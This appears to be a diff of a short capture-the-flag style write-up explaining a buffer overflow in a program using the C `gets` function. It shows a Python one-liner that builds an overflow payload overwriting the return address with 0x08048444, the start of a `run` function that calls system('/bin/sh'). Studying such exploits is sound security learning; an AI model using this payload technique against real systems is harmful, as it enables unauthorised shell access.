@@ -1,6 +1,8 @@
 # `gets` C function is vunerable to buffer overflow exploit
+
 # We prepare a payload for the exploit
 $> python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload
+
 # \x44\x84\x04\x08 correspond to the little endian of the address 08048444
 # The address correspond to the start of the `run` function
 # In the `run` function we can see a call to `system("/bin/sh")`
